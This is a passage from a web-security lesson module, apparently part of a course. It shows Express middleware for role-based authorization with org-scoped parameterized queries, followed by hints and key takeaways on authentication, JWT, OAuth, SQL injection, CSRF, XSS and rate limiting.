    if (!roles.includes(req.orgRole)) {
      return res.status(403).json({
        error: \`Requires org role: \${roles.join(' or ')}\`,
        yourRole: req.orgRole,
      });
    }
    next();
  };
}

// Middleware chain for a protected route:
app.get('/documents/:docId',
  authenticate,              // Verify JWT → sets req.user
  authorizeOrgAccess,        // Verify org membership → sets req.orgId, req.orgRole
  requireOrgRole('viewer', 'member', 'admin', 'owner'),  // Any role can view
  async (req, res) => {
    const doc = await db.query(
      'SELECT * FROM documents WHERE id = $1 AND org_id = $2',
      [req.params.docId, req.orgId]  // ALWAYS scope to org — prevents cross-org access
    );
    if (!doc.rows[0]) return res.status(404).json({ error: 'Document not found' });
    res.json(doc.rows[0]);
  }
);`,
      hints: [
        "Don't put org-specific roles in the JWT — a user has different roles in different orgs. Fetch the role from the database using the userId (from JWT) and orgId (from request header).",
        "Every database query for org-scoped resources must include AND org_id = $X — this prevents a member of org A from accessing org B's data even if they guess the document ID.",
        'Consider passing the org ID in a header (X-Org-Id) rather than the URL — it keeps the resource URL clean and makes it easy to add org context to all requests globally.',
      ],
    },
  ],

  keyTakeaways: [
    'Authentication (who are you?) returns 401 on failure. Authorization (what can you do?) returns 403 on failure. These are fundamentally different concepts with different HTTP status codes.',
    'JWT is stateless and scalable but cannot be revoked before expiry. Use 15-minute access tokens with 30-day refresh tokens to limit the revocation window.',
    'The JWT payload is base64-encoded, not encrypted. Never store passwords, PII, or sensitive data in a JWT payload — it is visible to anyone.',
    'OAuth 2.0 solves delegated authorization — letting third-party apps access your account without sharing your password. "Login with Google" is OAuth.',
    'SQL injection is prevented definitively only by parameterized queries. Input validation and escaping are defense-in-depth but not substitutes.',
    'CSRF exploits automatic browser cookie sending. Defend with CSRF tokens (attacker cannot read them cross-origin) and SameSite=Strict cookies.',
    'XSS injects malicious JavaScript into your page. Defend with output escaping, Content Security Policy headers, and HttpOnly cookies.',
    'Never return different error messages for "user not found" vs "wrong password" — this reveals which usernames exist (user enumeration).',
    'Secrets must never be hardcoded in source code. Use environment variables at minimum; use AWS Secrets Manager or HashiCorp Vault for production.',
    'Rate-limit authentication endpoints strictly — without limits, login and password-reset endpoints are trivially brute-forceable.',
  ],
};
